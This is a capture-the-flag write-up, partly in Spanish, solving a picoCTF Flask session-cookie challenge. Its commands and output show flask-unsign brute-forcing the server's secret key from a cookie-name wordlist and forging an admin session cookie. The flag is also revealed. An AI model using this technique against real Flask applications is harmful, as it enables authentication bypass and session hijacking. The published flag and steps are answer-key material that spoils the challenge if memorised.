## Objetivo 
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py) [http://mercury.picoctf.net:65344/](http://mercury.picoctf.net:65344/)
## Solución  
```bash
kali@KaliEND:~/Downloads/PicoCTF/Act13$ ls  
kali@KaliEND:~/Downloads/PicoCTF/Act13$ wget https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py  
--2024-10-01 14:51:32--  https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py  
Resolviendo mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142  
Conectando con mercury.picoctf.net (mercury.picoctf.net)[18.189.209.142]:443... conectado.  
Petición HTTP enviada, esperando respuesta... 200 OK  
Longitud: 2021 (2,0K) [application/octet-stream]  
Grabando a: «server.py»  
  
server.py                        100%[========================================================>]   1,97K  --.-KB/s    en 0s         
  
2024-10-01 14:51:32 (34,0 MB/s) - «server.py» guardado [2021/2021]  
  
kali@KaliEND:~/Downloads/PicoCTF/Act13$ ls  
server.py
kali@KaliEND:~/Downloads/PicoCTF/Act13$ python3 -m venv venv  
kali@KaliEND:~/Downloads/PicoCTF/Act13$ source venv/bin/activate  
(venv) kali@KaliEND:~/Downloads/PicoCTF/Act13$ echo "snickerdoodle  
chocolate chip  
oatmeal raisin  
gingersnap  
shortbread  
peanut butter  
whoopie pie  
sugar  
molasses  
kiss  
biscotti  
butter  
spritz  
snowball  
drop  
thumbprint  
pinwheel  
wafer  
macaroon  
fortune  
crinkle  
icebox  
gingerbread  
tassie  
lebkuchen  
macaron  
black and white  
white chocolate macadamia" > cookies.txt  
(venv) kali@KaliEND:~/Downloads/PicoCTF/Act13$ ls  
cookies.txt  server.py  venv  
(venv) kali@KaliEND:~/Downloads/PicoCTF/Act13$ flask-unsign -u --server "http://mercury.picoctf.net:65344/" --wordlist cookies.txt  
   
[*] Server returned HTTP 302 (FOUND)  
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZvxtQQ.Qru-eIn2Drthtf-RaIrGdXASszs  
[*] Session decodes to: {'very_auth': 'blank'}  
[*] Starting brute-forcer with 8 threads..  
[+] Found secret key after 28 attemptscadamia  
'fortune'  
(venv) kali@KaliEND:~/Downloads/PicoCTF/Act13$ flask-unsign -s --cookie "{very_auth: 'admin'}" -S fortune  
Int2ZXJ5X2F1dGg6ICdhZG1pbid9Ig.Zvxtjg.QYNqrSqkEpRy2IiF8CCVAUAGJjA  
(venv) kali@KaliEND:~/Downloads/PicoCTF/Act13$ flask-unsign -s --cookie "{'very_auth': 'admin'}" -S fortune  
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZvxuPw.-wdsG77fuSLQsmGG-wHPqmiHloY
```
## Notas Adicionales 
en este problema teniamos que descubrir la cookie correcta, para eso tenemos que usar flask-unsign, en mi kali no me lo dejaba instalar asi que cree un entorno aislado del sistema llamado venv y ahi lo instale y utilice, copie del archivo server.py la lista de cookies posibles, ademas observe que tenia que estar loggeado como admin para poder acceder a la flag, entonces meti todas las cookies a un .txt que llame `cookies.txt` es basicamente un wordlist, despues hice un ataque de fuerza bruta hacia la pagina usando flask y el wordlist`flask-unsign -u --server "http://mercury.picoctf.net:65344/" --wordlist cookies.txt 
encontre la cookie correcta para mi (creo que cambia segun lo haga cada quien): `fortune`
entonces directamente hice que flask me firmara la cookie pero cambiando los valores de `very_auth` a `admin` utilizando el secreto fortune, obteniendo una nueva cookie: `eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZvxuPw.-wdsG77fuSLQsmGG-wHPqmiHloY`
La cual despues inserte en el cookie editor y recarge la pagina para loggearme como admin con la cookie fortune y obtener la flag (`picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}`).
### Referencias